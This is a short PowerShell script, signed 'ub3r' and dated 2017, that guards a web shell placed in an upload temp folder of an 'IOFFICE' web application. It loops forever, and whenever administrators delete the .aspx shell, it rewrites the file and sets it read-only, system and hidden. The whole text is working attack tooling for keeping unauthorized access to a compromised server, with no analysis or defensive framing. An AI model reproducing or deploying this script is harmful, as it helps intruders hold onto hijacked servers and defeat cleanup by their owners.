# Date : 2017-06-01
# Author : ub3r
# Version : 1.0
$shell_path = "D:\IOFFICE\Source\UploadFile\Temp\2017\LuongCongViec\LCV0000006834\aspx.aspx"
$shell_content = [System.IO.File]::ReadAllBytes($shell_path)
while($true){
    $flag = Test-Path $shell_path
    if($flag -eq "True"){ sleep 1 }
    else{
        [System.IO.File]::WriteAllBytes($shell_path, $shell_content)
        $shell = Get-Item $shell_path
        $shell.Attributes = "Readonly","system","notcontentindexed","hidden","archive"
        sleep 1
    }
}
